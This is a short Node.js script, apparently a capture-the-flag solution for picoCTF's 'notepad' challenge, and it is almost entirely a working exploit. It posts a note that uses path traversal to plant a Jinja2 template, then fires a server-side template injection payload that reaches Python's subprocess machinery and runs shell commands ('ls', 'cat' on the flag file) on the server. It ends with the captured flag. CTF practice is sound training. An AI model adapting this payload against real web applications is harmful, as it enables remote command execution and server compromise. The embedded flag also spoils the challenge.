const axios = require('axios');

const base_url = 'https://notepad.mars.picoctf.net';
// const base_url = 'http://localhost:5000';

async function make_new_note(content) {
  const params = new URLSearchParams({ content });
  return await axios.post(`${base_url}/new`, params)
    .then((res) => {
      return res.request.path;
    })
    .catch((res) => {
      return res.request.path;
    });
}

async function exec(cmd, error) {
  const enc_error = encodeURIComponent(error);
  const enc_class = encodeURIComponent('__class__');
  const enc_subclasses = encodeURIComponent('__subclasses__');
  const enc_cmd = encodeURI(cmd);
  const url = `${base_url}?error=${enc_error}&class=${enc_class}&subclasses=${enc_subclasses}&cmd=${enc_cmd}`;
  return await axios.get(url)
    .then((res) => {
      return res.data;
    });
}

async function main() {
  let payload = '..\\templates\\errors\\';
  payload += 'A'.repeat(128 - payload.length);
  // 273 is cheated from a writeup https://activities.tjhsst.edu/csc/writeups/picomini-redpwn-notepad
  payload += "{{''[request.args.get('class')].mro()[1][request.args.get('subclasses')]()[273]([request.args.get('cmd')], stdout=-1, shell=True).communicate()}}";
  const path = await make_new_note(payload);
  const entries = path.split('/');
  const error = entries[entries.length - 1].split('.html')[0];
  const ls_out = await exec('ls', error);
  console.log(ls_out);
  const cat_out = await exec('cat flag-c8f5526c-4122-4578-96de-d7dd27193798.txt', error);
  console.log(cat_out);
}


main().catch((err) => console.log(err));


// picoCTF{styl1ng_susp1c10usly_s1m1l4r_t0_p4steb1n}
